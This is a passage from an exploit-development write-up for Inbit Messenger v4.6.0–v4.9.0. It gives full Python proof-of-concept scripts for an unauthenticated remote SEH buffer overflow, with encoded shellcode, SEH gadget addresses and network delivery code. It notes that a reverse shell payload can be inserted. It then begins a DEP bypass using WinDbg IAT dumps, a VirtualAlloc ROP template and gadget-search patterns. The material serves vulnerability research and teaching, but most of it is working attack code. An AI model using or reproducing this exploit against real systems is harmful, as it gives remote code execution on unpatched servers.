nSEH = b"\xEB\x06\x90\x90"           # JMP SHORT 0x8; NOP; NOP
SEH  = struct.pack("<I", 0x263ae1bd) # ipworks6.dll | POP EBP; POP EBX; RET

# NOTE: sets the TEB's ACTIVATION_CONTEXT_STACK.ActiveFrame = NULL
NULL_ACT_CTX_STUB  = b"\x31\xC0\xBB\x00\x10"
NULL_ACT_CTX_STUB += b"\x00\x00\x64\x8B\x48"
NULL_ACT_CTX_STUB += b"\x18\x39\x99\xA8\x01"
NULL_ACT_CTX_STUB += b"\x00\x00\x7C\x0A\x8B"
NULL_ACT_CTX_STUB += b"\x99\xA8\x01\x00\x00"
NULL_ACT_CTX_STUB += b"\x89\x03\xEB\x06\x89"
NULL_ACT_CTX_STUB += b"\x81\xB0\x01\x00\x00" 

SHELLCODE = # NOTE: you need to fill this in with your reverse shell

pkt  = b"<"
pkt += (b"A" * 40)
pkt += nSEH
pkt += SEH
pkt += NULL_ACT_CTX_STUB
pkt += (b"\x90" * 32) # NOP sled for shikata_ga_nai decoder
pkt += SHELLCODE
# NOTE: need to send 1600+ bytes to overwrite beyond top of thread's stack
pkt += (b"B" * (PAYLOAD_LENGTH - len(pkt)))

# check for bad bytes
for c in pkt:
  if c in BAD_BYTES:
    print(f"[-] found bad byte 0x{02x:c} in payload")
    sys.exit(-1)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], int(sys.argv[2])))
s.send(pkt)
s.close()
```

And this PoC finally gives us a reverse shell!

## Unauthenticated Remote SEH Overflow PoC

For demo purposes, we will modify the shellcode payload to display a notification when we have a successful exploit. Here is the final PoC:

```python
import sys, socket, struct, argparse, logging

"""
/opt/metasploit-framework/bin/msfvenom \
  -p windows/messagebox \
  ICON=WARNING          \
  TEXT="get wrecked"    \
  TITLE="LOLZ"          \
  EXITFUNC=thread       \
  -f py                 \
  -v SHELLCODE          \
  -e x86/shikata_ga_nai \
  -b '\x3E'           
"""
SHELLCODE =  b""
SHELLCODE += b"\xba\xbd\x3d\x03\xfa\xd9\xc9\xd9\x74\x24\xf4"
SHELLCODE += b"\x5b\x31\xc9\xb1\x41\x31\x53\x14\x03\x53\x14"
SHELLCODE += b"\x83\xc3\x04\x5f\xc8\xda\x11\x04\xea\xa9\xc1"
SHELLCODE += b"\xce\x3c\x80\xb8\x59\x0e\xed\xd9\x2e\x01\xdd"
SHELLCODE += b"\xaa\x46\xee\x96\xdb\xba\x65\xee\x2b\x49\x07"
SHELLCODE += b"\xcf\xa0\x7b\xc0\x40\xaf\xf6\xc3\x06\xce\x29"
SHELLCODE += b"\xdc\x58\xb0\x42\x4f\xbf\x15\xdf\xd5\x83\xde"
SHELLCODE += b"\x8b\xfd\x83\xe1\xd9\x75\x39\xfa\x96\xd0\x9e"
SHELLCODE += b"\xfb\x43\x07\xea\xb2\x18\xfc\x98\x44\xf0\xcc"
SHELLCODE += b"\x61\x77\xcc\xd3\x32\xfc\x0c\x5f\x4c\x3c\x43"
SHELLCODE += b"\xad\x53\x79\xb0\x5a\x68\xf9\x62\x8b\xfa\xe0"
SHELLCODE += b"\xe1\x91\x20\xe2\x1e\x43\xa2\xe8\xab\x07\xee"
SHELLCODE += b"\xec\x2a\xf3\x84\x09\xa7\x02\x73\x98\xf3\x20"
SHELLCODE += b"\x9f\xfa\x38\x9a\x97\xd5\x6a\x52\x42\xac\x50"
SHELLCODE += b"\x0d\x03\xe1\x5a\x22\x49\x16\xfd\x45\x91\x19"
SHELLCODE += b"\x88\xff\x6a\x5d\x65\x31\x92\xc1\xfe\xd2\x77"
SHELLCODE += b"\x50\xe8\x65\x88\xab\x17\xf0\x32\x5c\x8f\x6f"
SHELLCODE += b"\xd1\x7c\x0e\x18\x1a\x4f\xbe\xbc\x34\xda\xcd"
SHELLCODE += b"\x59\xb7\x14\xea\x2a\x6b\x71\x06\xa2\x72\x2f"
SHELLCODE += b"\xe9\xe1\x7e\x59\xd7\x5a\xc4\xf1\x75\x17\x86"
SHELLCODE += b"\x85\x65\x8c\xa4\x61\xca\x33\xb7\x8d\x9c\x93"
SHELLCODE += b"\x68\x52\x7c\x4c\x25\xdd\x30\xd6\x84\x3a\x40"
SHELLCODE += b"\xba\xc2\xb8\xd9\xa0\x63\xaa\xbc\x42\x2c\x44"
SHELLCODE += b"\x49\xf9\xa9\xf7\xdd\x9a\x54\x8c\x3d\x54\x5e"
SHELLCODE += b"\xe4\x71\xb2\x6b\x7c\x68\x8b\xb9\x14\x5a\xbf"
SHELLCODE += b"\x6c\xbb\x65\xef\xbe\xfb\xc9\xef\x94\xf3"

BANNER = """\033[0m\033[1;35m
╔═════════════════════════════════════════════════════════════════════╗
║\033[0m Inbit Messenger v4.6.0 - v4.9.0 Unauthenticated Remote SEH Overflow \033[1;35m║
╚═════════════════════════════════════════════════════════════════════╝\033[0m
 by: \033[1;36m █████╗      ██████╗ ███████╗██╗   ██╗
     \033[1;36m██╔══██╗     ██╔══██╗██╔════╝██║   ██║
     \033[1;36m███████║ ███ ██████╔╝█████╗   ██╗ ██═╝
     \033[1;36m██╔══██║     ██╔══██╗██╔══╝     ██╔╝  
     \033[1;36m██║  ██║     ██║  ██║███████╗   ██║   
     \033[1;36m╚═╝  ╚═╝     ╚═╝  ╚═╝╚══════╝   ╚═╝   
\033[0m"""

BAD_BYTES = b"\x3e" # >
PAYLOAD_LENGTH = 2000

nSEH = b"\xEB\x06\x90\x90"           # JMP SHORT 0x8; NOP; NOP
SEH  = struct.pack("<I", 0x263ae1bd) # ipworks6.dll | POP EBP; POP EBX; RET

# NOTE: sets the TEB's ACTIVATION_CONTEXT_STACK.ActiveFrame = NULL
NULL_ACT_CTX_STUB  = b"\x31\xC0\xBB\x00\x10"
NULL_ACT_CTX_STUB += b"\x00\x00\x64\x8B\x48"
NULL_ACT_CTX_STUB += b"\x18\x39\x99\xA8\x01"
NULL_ACT_CTX_STUB += b"\x00\x00\x7C\x0A\x8B"
NULL_ACT_CTX_STUB += b"\x99\xA8\x01\x00\x00"
NULL_ACT_CTX_STUB += b"\x89\x03\xEB\x06\x89"
NULL_ACT_CTX_STUB += b"\x81\xB0\x01\x00\x00" 

def exploit(targetIp:str, targetPort:int) -> None:
  pkt  = b"<"
  pkt += (b"A" * 40)
  pkt += nSEH
  pkt += SEH
  pkt += NULL_ACT_CTX_STUB
  pkt += (b"\x90" * 32) # NOP sled for shikata_ga_nai decoder
  pkt += SHELLCODE
  # NOTE: need to send 1600+ bytes to overwrite beyond top of thread's stack
  pkt += (b"B" * (PAYLOAD_LENGTH - len(pkt)))
  # NOTE: check for bad bytes
  for c in pkt:
    if c in BAD_BYTES:
      logging.error(f"found bad byte 0x{c:02x} in payload")
      sys.exit(-1)
  logging.info(f"sending {len(pkt)} byte payload to {targetIp}:{targetPort} ...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((targetIp, targetPort))
  s.send(pkt)
  s.close()
  logging.success("DONE")

if __name__ == '__main__':
  # parse arguments
  parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter, usage=BANNER)
  parser.add_argument('-t', '--target', help='target IP',   type=str, required=True)
  parser.add_argument('-p', '--port',   help='target port', type=int, required=False, default=10883)
  args = parser.parse_args()
  # define logger
  logging.basicConfig(format='[%(asctime)s][%(levelname)s] %(message)s', datefmt='%d %b %Y %H:%M:%S', level='INFO')
  logging.SUCCESS = logging.CRITICAL + 1
  logging.addLevelName(logging.SUCCESS, '\033[0m\033[1;32mGOOD\033[0m')
  logging.addLevelName(logging.ERROR,   '\033[0m\033[1;31mFAIL\033[0m')
  logging.addLevelName(logging.WARNING, '\033[0m\033[1;33mWARN\033[0m')
  logging.addLevelName(logging.INFO,    '\033[0m\033[1;36mINFO\033[0m')
  logging.success = lambda msg, *args: logging.getLogger(__name__)._log(logging.SUCCESS, msg, args)
  # print banner
  print(BANNER)
  # run exploit
  exploit(args.target, args.port)
```

And here is the demo:

https://raw.githubusercontent.com/a-rey/exploits/main/writeups/Inbit_Messenger/v4.6.0/img/win10.mov

*We could stop here, but we will try to take the vulnerability a bit further ...*

## Testing Other Versions

Since there are other versions of this software available, we will attempt to see how applicable this vulnerability is across the other versions available in the WayBackMachine Internet archive using the installer links at the beginning of this writeup.

- `v4.9.0` - **Vulnerable**
- `v4.8.0` - **Vulnerable**
- `v3.1.0` - Not Vulnerable (no crash or any indicators for presence of same vulnerability)
- `v2.4.0` - Not Vulnerable (no crash or any indicators for presence of same vulnerability)
- `v1.4.0` - Not Vulnerable (no crash or any indicators for presence of same vulnerability)

With this info, we can safely assume that software versions `v4.6.0` to `v4.9.0` are vulnerable! There may be other similar vulnerabilities in software versions before `v4.6.0`, but we can leave that as an exercise for another day. Other versions before `v4.6.0` but after `v3.1.0` may also be vulnerable, but we cannot safely validate this claim since we do not have those software versions to test on. 

For OS portability, we can test this exploit on Windows 7 with `v4.8.0`:

https://raw.githubusercontent.com/a-rey/exploits/main/writeups/Inbit_Messenger/v4.6.0/img/win7.mov

And once more on Windows XP with `v4.9.0`:

https://raw.githubusercontent.com/a-rey/exploits/main/writeups/Inbit_Messenger/v4.6.0/img/winxp.mov

*We could also stop here as well, but we will take this vulnerability even further ...*

## Enabling DEP

Data Execution Protection (**DEP**) is a set of hardware and software technologies that perform additional memory checks to help prevent malicious code from  running on a system. DEP helps prevent code execution from data pages by raising an exception when attempts are made to do so. On compatible CPUs, DEP sets the non-executable (NX) bit that distinguishes between code and data areas in memory. An operating system supporting the NX bit can mark certain areas of memory non-executable, meaning the CPU won’t execute any code residing there. 

Windows can be configured through the `/NoExecute` option in `boot.ini` (Windows XP) or through `bcdedit.exe`, (from Windows Vista and above) to run in one of four modes.

- `OptIn`: DEP is enabled for system processes and custom-defined applications only.
- `OptOut`: DEP is enabled for everything except specifically exempt applications.
- `AlwaysOn`: DEP is permanently enabled.
- `AlwaysOff`: DEP is permanently disabled.

Windows client operating systems like Windows 7 and Windows 10, have `OptIn` as the default setting. Windows server editions like Windows Server 2012 or Windows Server 2019 have `AlwaysOn` as the default setting.

The test environment for this writeup is Windows 10, so we will force enable DEP for this application to make this exploit viable for modern Windows server editions too. Open the Windows security manager:

![26](./img/26.png)

Select `App & Browser Control`:

![27](./img/27.png)

Then scroll down to select `Exploit protectioon Settings`:

![28](./img/28.png)

Now select the `Program settings` tab:

![29](./img/29.png)

Then select the `Add program to customize` and then `Choose exact file path`:

![30](./img/30.png)

Now navigate to `C:\Program Files\Inbit\Inbit Messenger Server\IMS.EXE`:

![31](./img/31.png)

Then in the new window, scroll down to DEP and check `Override system settings` and then ensure it is `On`:

![32](./img/32.png)

Now select `Apply` and be sure to restart/close any running instances of `IMS.EXE`. If we send our current exploit now with `IMS.EXE` attached to WinDbg, we will get the following exception chain:

```
(136c.c94): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000042 ebx=00000624 ecx=00000002 edx=00000001 esi=01d6e2b0 edi=775423a0
eip=00466e3f esp=0014f8b4 ebp=0014fa10 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
IMS+0x66e3f:
00466e3f 88441dcc        mov     byte ptr [ebp+ebx-34h],al  ss:0023:00150000=41
0:000> bp 0x263ae1bd
0:000> g
Breakpoint 0 hit
eax=00000000 ebx=00000000 ecx=263ae1bd edx=77a45e30 esi=00000000 edi=00000000
eip=263ae1bd esp=0014f2c0 ebp=0014f2e0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ipworks6!NetCode_StaticDestroy+0x39852:
263ae1bd 5d              pop     ebp
0:000> t
eax=00000000 ebx=00000000 ecx=263ae1bd edx=77a45e30 esi=00000000 edi=00000000
eip=263ae1be esp=0014f2c4 ebp=77a45e12 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ipworks6!NetCode_StaticDestroy+0x39853:
263ae1be 5b              pop     ebx
0:000> t
eax=00000000 ebx=0014f3c0 ecx=263ae1bd edx=77a45e30 esi=00000000 edi=00000000
eip=263ae1bf esp=0014f2c8 ebp=77a45e12 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ipworks6!NetCode_StaticDestroy+0x39854:
263ae1bf c3              ret
0:000> t
eax=00000000 ebx=0014f3c0 ecx=263ae1bd edx=77a45e30 esi=00000000 edi=00000000
eip=0014fa04 esp=0014f2cc ebp=77a45e12 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0014fa04 eb06            jmp     0014fa0c
0:000> t
(136c.c94): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=0014f3c0 ecx=263ae1bd edx=77a45e30 esi=00000000 edi=00000000
eip=0014fa04 esp=0014f2cc ebp=77a45e12 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
0014fa04 eb06            jmp     0014fa0c
```

Here we triggered the exception for writing beyond the thread's stack and then began execution of our SEH handler gadget that redirected execution to the stack. Then, when we tried to execute the `JMP SHORT 0x8; NOP; NOP` at the beginning of our SEH handler, we got an exception because the stack is not executable:

```
0:000> !address eip

Usage:                  Stack
Base Address:           0014b000
End Address:            00150000
Region Size:            00005000 (  20.000 kB)
State:                  00001000          MEM_COMMIT
Protect:                00000004          PAGE_READWRITE
Type:                   00020000          MEM_PRIVATE
Allocation Base:        00050000
Allocation Protect:     00000004          PAGE_READWRITE
More info:              ~0k

Content source: 1 (target), length: 5fc
```

We will now bypass this protection ROP (Return Oriented Programming).

## Choosing a DEP Bypass Method

Before we look for ROP gadgets, we need to figure out a method to bypass DEP. This is done by looking at the IAT (Import Address Tables) of **non-ASLR** modules in our process's virtual memory space and see if there is a entry for one of the following functions:

- `VirtualAlloc`
- `VirtualProtect`
- `WriteProcessMemory`

We previously used `ipworks6.dll` for our SEH gadget. Since our only bad byte is `0x3E`, we will re-use this module as our first target to search for a DEP bypass method. If we do not find what we are looking for there, we can expand our search to other non-ASLR modules. Run the following in WinDbg to display the IAT for `ipworks6.dll`:

**NOTE:** This stub is a little WinDbg script that loops through the IAT of a module by parsing the Import Directory of Microsoft's Portable Executable file format in memory given a module's base address.

```powershell
r $t0 = poi(ipworks6 + poi(ipworks6 + 0x3c) + 0xd8)
r $t1 = poi(ipworks6 + poi(ipworks6 + 0x3c) + 0xdc)
dps ipworks6+$t0 l? (($t1+4)/4) 
```

And we get the following list:

```
263b4000  7678ea20 ADVAPI32!RegQueryValueExAStub
263b4004  7678eaf0 ADVAPI32!RegCloseKeyStub
263b4008  7678ebe0 ADVAPI32!RegOpenKeyExAStub
263b400c  00000000
263b4010  77405ac0 GDI32!GetStockObjectStub
263b4014  737b4d00 apphelp!DWM8AND16BitHook_CreateCompatibleDC
263b4018  77403ba0 GDI32!DeleteObject
263b401c  774050f0 GDI32!SelectObject
263b4020  737b4e00 apphelp!DWM8AND16BitHook_BitBlt
263b4024  77403b30 GDI32!DeleteDC
263b4028  774052a0 GDI32!SetBkColorStub
263b402c  00000000
263b4030  766f9070 KERNEL32!LoadLibraryAStub
263b4034  766f60a0 KERNEL32!LCMapStringWStub
263b4038  766fb4c0 KERNEL32!LCMapStringAStub
263b403c  766f6f30 KERNEL32!GetStringTypeWStub
263b4040  766fb4e0 KERNEL32!GetStringTypeAStub
263b4044  766fb850 KERNEL32!GetOEMCPStub
263b4048  766f8650 KERNEL32!GetCPInfoStub
263b404c  766f58a0 KERNEL32!GetProcAddressStub
263b4050  766fa9b0 KERNEL32!IsBadCodePtr
263b4054  766f3580 KERNEL32!IsBadReadPtr
263b4058  766f8fb0 KERNEL32!SetUnhandledExceptionFilterStub
263b405c  766f9810 KERNEL32!GetEnvironmentStringsWStub
263b4060  766f8f20 KERNEL32!GetEnvironmentStringsStub
263b4064  766f9520 KERNEL32!FreeEnvironmentStringsWStub
263b4068  766f8780 KERNEL32!FreeEnvironmentStringsAStub
263b406c  766f7b00 KERNEL32!GetStartupInfoA
263b4070  766fd060 KERNEL32!GetFileType
263b4074  766f7430 KERNEL32!FreeLibraryStub
263b4078  766fc150 KERNEL32!GetTickCountStub
263b407c  766f4e40 KERNEL32!QueryPerformanceFrequencyStub
263b4080  766f9f50 KERNEL32!GetTimeZoneInformationStub
263b4084  766f7410 KERNEL32!SystemTimeToFileTimeStub
263b4088  766fce60 KERNEL32!FileTimeToLocalFileTime
263b408c  76710770 KERNEL32!SetCurrentDirectoryAStub
263b4090  766fd2f0 KERNEL32!FileTimeToSystemTime
263b4094  766fcba0 KERNEL32!CloseHandle
263b4098  766f7120 KERNEL32!GetSystemTimeStub
263b409c  766f6250 KERNEL32!GetComputerNameA
263b40a0  766f7140 KERNEL32!GetACPStub
263b40a4  766fd0c0 KERNEL32!GetTempFileNameA
263b40a8  766fd0e0 KERNEL32!GetTempPathA
263b40ac  766fce30 KERNEL32!DeleteFileA
263b40b0  766f87a0 KERNEL32!GetModuleFileNameAStub
263b40b4  766fd280 KERNEL32!WriteFile
263b40b8  766fd030 KERNEL32!GetFileSize
263b40bc  766fd220 KERNEL32!SetFilePointer
263b40c0  766fce00 KERNEL32!CreateFileA
263b40c4  766fd190 KERNEL32!ReadFile
263b40c8  766fce70 KERNEL32!FindClose
263b40cc  766fcf20 KERNEL32!FindNextFileA
263b40d0  766f3750 KERNEL32!GetLastErrorStub
263b40d4  766fceb0 KERNEL32!FindFirstFileA
263b40d8  766fb150 KERNEL32!MoveFileA
263b40dc  76710910 KERNEL32!SetSystemTimeStub
263b40e0  766f95b0 KERNEL32!GetVersionExAStub
263b40e4  766f3890 KERNEL32!QueryPerformanceCounterStub
263b40e8  766f3640 KERNEL32!WideCharToMultiByteStub
263b40ec  766f38b0 KERNEL32!MultiByteToWideCharStub
263b40f0  766f3860 KERNEL32!GlobalFreeStub
263b40f4  766f3760 KERNEL32!GlobalUnlock
263b40f8  766f3450 KERNEL32!GlobalLock
263b40fc  766f45c0 KERNEL32!GlobalAllocStub
263b4100  766f9370 KERNEL32!RtlUnwindStub
263b4104  766e4a80 KERNEL32!HeapFreeStub
263b4108  779ddd80 ntdll!RtlReAllocateHeap
263b410c  779da370 ntdll!RtlAllocateHeap
263b4110  766f9920 KERNEL32!GetCommandLineAStub
263b4114  766f9d80 KERNEL32!GetVersionStub
263b4118  766efcc0 KERNEL32!GetCurrentThreadId
263b411c  766f3660 KERNEL32!TlsSetValueStub
263b4120  766f7270 KERNEL32!TlsAllocStub
263b4124  766f71b0 KERNEL32!TlsFreeStub
263b4128  766f3440 KERNEL32!SetLastErrorStub
263b412c  766efca0 KERNEL32!TlsGetValueStub
263b4130  766f9560 KERNEL32!HeapDestroyStub
263b4134  766f8990 KERNEL32!HeapCreateStub
263b4138  766f56a0 KERNEL32!VirtualFreeStub
263b413c  77a0b750 ntdll!RtlInitializeCriticalSection
263b4140  779fcc20 ntdll!RtlDeleteCriticalSection
263b4144  779e5be0 ntdll!RtlEnterCriticalSection
263b4148  779e5b20 ntdll!RtlLeaveCriticalSection
263b414c  766fe5e0 KERNEL32!ExitProcessImplementation
263b4150  766f4da0 KERNEL32!VirtualAllocStub
263b4154  766f3680 KERNEL32!IsBadWritePtr
263b4158  766f9930 KERNEL32!TerminateProcessStub
263b415c  766fcb40 KERNEL32!GetCurrentProcess
263b4160  766fa470 KERNEL32!SetHandleCount
263b4164  766f6f50 KERNEL32!GetStdHandleStub
263b4168  00000000
263b416c  775c80e0 USER32!GetActiveWindow
263b4170  775ef090 USER32!DialogBoxParamA
263b4174  775aa470 USER32!EndDialog
263b4178  775aabb0 USER32!SetDlgItemTextA
263b417c  775b2ea0 USER32!SendMessageA
263b4180  775b7620 USER32!GetWindowRect
263b4184  775b7c90 USER32!GetSystemMetrics
263b4188  775d4bd0 USER32!NtUserMoveWindow
263b418c  775d5310 USER32!NtUserSetWindowPos
263b4190  775afc80 USER32!GetDlgItem
263b4194  775d3fd0 USER32!NtUserBeginPaint
263b4198  775bfa60 USER32!LoadBitmapA
263b419c  775d43d0 USER32!NtUserEndPaint
263b41a0  776147f0 USER32!MessageBeep
263b41a4  737f51e0 apphelp!SrHook_MessageBoxA
263b41a8  775c48c0 USER32!wsprintfA
263b41ac  77a451a0 ntdll!NtdllDefWindowProc_A
263b41b0  775b2840 USER32!GetWindowLongA
263b41b4  775aed60 USER32!SetWindowLongA
263b41b8  737b5db0 apphelp!DWM8AND16BitHook_DestroyWindow
263b41bc  775c16c0 USER32!MsgWaitForMultipleObjects
263b41c0  775af760 USER32!IsWindow
263b41c4  775c7d00 USER32!DispatchMessageA
263b41c8  775ae610 USER32!TranslateMessage
263b41cc  775c8de0 USER32!PostQuitMessage
263b41d0  775bfff0 USER32!PeekMessageA
263b41d4  775c67e0 USER32!PostMessageA
263b41d8  775bca50 USER32!CreateWindowExA
263b41dc  775bdcc0 USER32!RegisterClassA
263b41e0  775bd390 USER32!UnregisterClassA
263b41e4  775bc840 USER32!RegisterWindowMessageA
263b41e8  00000000
263b41ec  00000000
```

If we search through the list, we get the following:

```
263b4150  766f4da0 KERNEL32!VirtualAllocStub
```

Nice! We already found a DEP bypass method we can use at an IAT address without a bad byte. All we need to do is de-reference `0x263b4150` in our ROP chain to get the virtual address of `VirtualAlloc` at runtime in `kernel32.dll`. 

Our goal is to make a ROP chain that does the following:

- https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc

```c
int main(void) {
  unsigned char shellcode[] = { ... };
  
  VirtualAlloc(
      shellcode,   /* <- stack address of our shellcode */
      len,         /* <- this is the length of our shellcode */
      MEM_COMMIT, 
      PAGE_EXECUTE_READWRITE
  );
  (*(void (*)())shellcode)();
  return 0;
}
```

Before we continue, we need to modify our exploit template to accommodated our ROP chain:

```python
import sys, socket, struct, argparse, logging

BAD_BYTES = b"\x3e" # >
PAYLOAD_LENGTH = 2000

nSEH = b"1111"
SEH  = struct.pack("<I", 0x263ae1bd) # ipworks6.dll | POP EBP; POP EBX; RET

PLACEHOLDERS = [
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# KERNEL32!VirtualAllocStub
# https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  0x41414141, # virtual address of KERNEL32!VirtualAllocStub from IAT
  0x42424242, # address of shellcode (same as lpAddress)
  0x69696969, # arg1: lpAddress 
  0x00000200, # arg2: dwSize (512 bytes)
  0x00001000, # arg3: flAllocationType (MEM_COMMIT = 0x00001000)
  0x00000040, # arg4: flProtect (PAGE_EXECUTE_READWRITE = 0x00000040)
]

ROP = [
  0x69696969, # END OF CHAIN
]

def exploit(targetIp:str, targetPort:int) -> None:
  pkt  = b""
  pkt += b"".join([struct.pack("<I", _) for _ in PLACEHOLDERS])
  pkt += (b"A" * (40 - len(pkt)))
  pkt += nSEH
  pkt += SEH
  pkt += b"".join([struct.pack("<I", _) for _ in ROP])
  # NOTE: need to send 1600+ bytes to overwrite beyond top of thread's stack
  pkt += (b"B" * (PAYLOAD_LENGTH - len(pkt)))
  # NOTE: check for bad bytes
  for c in pkt:
    if c in BAD_BYTES:
      logging.error(f"found bad byte 0x{c:02x} in payload")
      sys.exit(-1)
  logging.info(f"sending {len(pkt)} byte payload to {targetIp}:{targetPort} ...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((targetIp, targetPort))
  s.send(b"<" + pkt)
  s.close()
  logging.success("DONE")

if __name__ == '__main__':
  # parse arguments
  parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter)
  parser.add_argument('-t', '--target', help='target IP',   type=str, required=True)
  parser.add_argument('-p', '--port',   help='target port', type=int, required=False, default=10883)
  args = parser.parse_args()
  # define logger
  logging.basicConfig(format='[%(asctime)s][%(levelname)s] %(message)s', datefmt='%d %b %Y %H:%M:%S', level='INFO')
  logging.SUCCESS = logging.CRITICAL + 1
  logging.addLevelName(logging.SUCCESS, '\033[0m\033[1;32mGOOD\033[0m')
  logging.addLevelName(logging.ERROR,   '\033[0m\033[1;31mFAIL\033[0m')
  logging.addLevelName(logging.WARNING, '\033[0m\033[1;33mWARN\033[0m')
  logging.addLevelName(logging.INFO,    '\033[0m\033[1;36mINFO\033[0m')
  logging.success = lambda msg, *args: logging.getLogger(__name__)._log(logging.SUCCESS, msg, args)
  # run exploit
  exploit(args.target, args.port)
```

There are some important changes here:

- We put the placeholders for our call to `VirtualAlloc` **before** our ROP chain because we will calculate offsets to these placeholders using our ROP chain. If we put the placeholders after the ROP chain, we would have to constantly adjust these relative stack offsets as our ROP chain grows. The only limitation is that our placeholders must be less than 40 bytes long to not overflow into the SEH record we control on the stack.
- Since our only bad byte is `>`, we can fill out our placeholders almost completely with the constant values for the call to `VirtualAlloc`. We will set `dwSize` to 512 bytes since that is plenty of space for a reverse shell.

With this starting PoC, we just need to dynamically set the first 3 placeholder values and then pivot our stack to the placeholders to then call `VirutalAlloc` and then return to our now executable shellcode on the stack!

## SEH Overflows With DEP

Since our execution control is done using SEH, we have a special case with ROP we need to account for. When we gain execution control, we are in the SEH handler called by the operating system. This means, even though we control the address of where the handler is, at the time of execution, **we do not control the stack**. This is a problem because for ROP to work, we need stack control so we can reliably return up the stack to execute our gadgets. For SEH, we need to pivot the stack from the OS handler back to wherever our ROP chain is in memory in order to begin our actual ROP chain.

Before we look for gadgets, we need to know approximately how far away our SEH stack is from where our ROP chain is. Send the current PoC and inspect the exception handler stack in WinDbg:

```
(59c.884): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000042 ebx=00000624 ecx=00000002 edx=00000001 esi=02454f20 edi=775423a0
eip=00466e3f esp=0014f8b4 ebp=0014fa10 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
IMS+0x66e3f:
00466e3f 88441dcc        mov     byte ptr [ebp+ebx-34h],al  ss:0023:00150000=41
0:000> !exchain
0014fa04: ipworks6!NetCode_StaticDestroy+39852 (263ae1bd)
Invalid exception stack at 31313131
0:000> dps 0014fa04 L0n2
0014fa04  31313131
0014fa08  263ae1bd ipworks6!NetCode_StaticDestroy+0x39852
0:000> bp 263ae1bd
0:000> g
Breakpoint 0 hit
eax=00000000 ebx=00000000 ecx=263ae1bd edx=77a45e30 esi=00000000 edi=00000000
eip=263ae1bd esp=0014f2c0 ebp=0014f2e0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ipworks6!NetCode_StaticDestroy+0x39852:
263ae1bd 5d              pop     ebp
```

In this run, our SEH handler is at `0x0014fa04` on the stack. However, once we gain execution using our old SEH gadget, the stack is at  `0x0014f2c0`. Find the difference:

```
0:000> ? 0x0014fa04 - 0x0014f2c0
Evaluate expression: 1860 = 00000744
```

1860 bytes. This means we need to set the SEH handler gadget to something that pivots the stack approximately 1860 bytes. We say approximately because it is unlikely that we will find something in assembly that does exactly the following as a gadget:

```assembly
add esp, 0x744
```

What we will look for instead is a gadget that pivots the stack **somewhere** into the stack buffer we control. One last thing we need to remember. Previously, we found that at the time our SEH handler is executed, **pointers** to our SEH handler on the stack can be found on the stack at the following offsets:

```
ESP + 0x08
ESP + 0x14
ESP + 0x1C
ESP + 0x2C

EBP + 0x0C
EBP + 0x1C
EBP + 0x30
```

## Finding General Gadgets

Now that we understand how far our SEH handler is from the stack the OS sets up for the handler, we can search for general gadgets that we will use for our ROP chain. There are many tools to generate ROP gadgets. For this writeup, we will use [RP++](https://github.com/0vercl0k/rp). On your system, run the following on `ipworks6.dll`:

```bash
.\rp-win-x86.exe -f ipworks6.dll -r 5 > rop.txt
```

And we get the following header for `rop.txt`:

```
Trying to open 'IPWORKS6.DLL'..
Loading PE information..
FileFormat: PE, Arch: Ia32
Using the Nasm syntax..

Wait a few seconds, rp++ is looking for gadgets..
in .text
46410 found.

A total of 46410 gadgets found.
```

46410 gadgets should be plenty. Remove this header from the file and search through the file using the following RexEx expressions to find gadgets we need:

```bash
# MEMORY READ/WRITE: 

: mov e.., dword \[e..\] .* ret
: mov dword \[e..\], e.. .* ret

# REGISTER SET: 

: pop e.. ; ret

# REGISTER MATH: 

: add e.., e.. .* ret
: sub e.., e.. .* ret
: inc e.. .* ret
: dec e.. .* ret
: not e.. .* ret
: neg e.. .* ret

# REGISTER MOVE: 

: xchg e.., e.. .* ret
: mov e.., e.. .* ret
: push e.. .* pop e.. .* ret

# GET ESP: 

: mov e.., esp.*ret
: push esp.*pop.*ret

# STACK PIVOT - SEH:

: pop.*pop.*pop esp
: pop.*pop.*pop e...*jmp dword \[e..
: pop.*pop.*pop e...*call dword \[e..
: popad.*jmp dword \[ebp
: popad.*jmp dword \[edx
: popad.*jmp dword \[eax
: popad.*call dword \[ebp
: popad.*call dword \[edx
: popad.*call dword \[eax
: mov e.., dword \[ebp.*call dword \[e..
: mov e.., dword \[ebp.*jmp dword \[e..
: mov e.., dword \[esp.*call dword \[e..
: mov e.., dword \[esp.*jmp dword \[e..

# STACK PIVOT - GENERAL:

: xchg e.., esp.*ret
: xchg esp, e...*ret
: add esp, dword
: add esp, 0x
```

